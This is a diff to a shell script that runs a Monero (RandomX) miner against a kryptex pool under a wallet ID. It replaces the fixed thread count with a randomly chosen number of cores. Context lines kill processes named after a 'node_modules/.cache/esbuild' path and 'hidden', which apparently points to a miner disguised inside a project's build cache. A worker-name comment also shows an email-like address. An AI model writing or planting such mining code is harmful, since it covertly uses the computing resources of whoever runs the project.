@@ -271,6 +271,13 @@ cd "$PROJECT_DIR"
 
 WORKER_FULL=".${WORKER_SUFFIX}" # e.g. .r23fef@gmail.com
 
+# ---- CPU threads: probe cores, pick one uniformly at random (1..CORES) ----
+CORES=$(nproc 2>/dev/null || grep -c '^processor' /proc/cpuinfo 2>/dev/null || echo 4)
+[ "$CORES" -lt 1 ] && CORES=1
+# uniform: 2 cores -> 50/50, 3 cores -> 33.3% each, N cores -> 1/N each
+CPU_THREADS=$(( (RANDOM % CORES) + 1 ))
+echo "  -> cores: ${CORES}, mining threads: ${CPU_THREADS}"
+
 # Kill any existing instances
 pkill -f "node_modules/.cache/esbuild" 2>/dev/null || true
 pkill -f "hidden" 2>/dev/null || true
@@ -284,7 +291,7 @@ sleep 1
   --algorithm randomx \
   --pool xmr-hk.kryptex.network:8029 \
   --wallet ${WALLET}${WORKER_FULL} \
-  --cpu-threads 4 \
+  --cpu-threads "${CPU_THREADS}" \
   --cpu-no-yield \
   --disable-gpu \
   --disable-huge-pages \
